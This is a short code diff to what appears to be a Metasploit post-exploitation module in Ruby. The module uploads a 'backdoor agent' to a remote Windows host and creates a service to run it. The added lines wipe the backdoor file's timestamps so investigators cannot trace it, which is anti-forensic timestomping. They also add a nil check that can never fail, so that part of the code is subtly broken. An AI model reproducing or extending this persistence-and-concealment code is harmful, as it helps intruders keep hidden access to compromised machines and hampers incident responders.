@@ -214,6 +214,21 @@ def ls_stage1
         print_good(" Uploading #{p_name} agent...")
         client.fs.file.upload("#{d_path}\\#{p_name}","#{u_path}")
 
+
+        # check if remote path exists?
+        bin_path = "#{d_path}\\#{p_name}"
+        if bin_path.nil?
+          print_error("ABORT: post-module cant find backdoor binary...")
+          print_error("Please check: #{bin_path}")
+          return nil
+        end
+
+        # Change payload timestamp (date:time)
+        print_good(" Blank backdoor agent timestamp...")
+        client.priv.fs.blank_file_mace("#{d_path}\\#{p_name}")
+        sleep(1.0)
+
+
           # creating remote service ...
           print_good(" Creating service: #{s_name} ...")
           print_good(" Execute => #{c_omm}")
